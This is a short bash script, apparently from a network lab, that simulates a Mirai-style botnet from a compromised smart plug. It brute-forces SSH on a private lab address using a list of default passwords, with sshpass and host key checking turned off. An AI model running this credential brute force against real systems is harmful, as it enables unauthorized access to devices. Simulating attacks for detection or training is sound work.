#!/usr/bin/env bash
echo "[ATTACK] smart_plug compromis — brute force SSH intern..."

# Brute-force SSH real: încercări de login cu parole greșite
# Simulează un botnet Mirai care încearcă credențiale default
# Lista de parole tipice Mirai: admin, root, 1234, password, etc.
PASSWORDS=("admin" "root" "1234" "password" "12345" "test" "guest" "ubnt" "support" "user")

for pass in "${PASSWORDS[@]}"; do
  for user in root admin; do
    sshpass -p "$pass" ssh \
      -o StrictHostKeyChecking=no \
      -o ConnectTimeout=2 \
      -o NumberOfPasswordPrompts=1 \
      "${user}@172.20.0.5" \
      exit 2>/dev/null || true
    sleep 0.2
  done
done

echo "[ATTACK] Brute force terminat."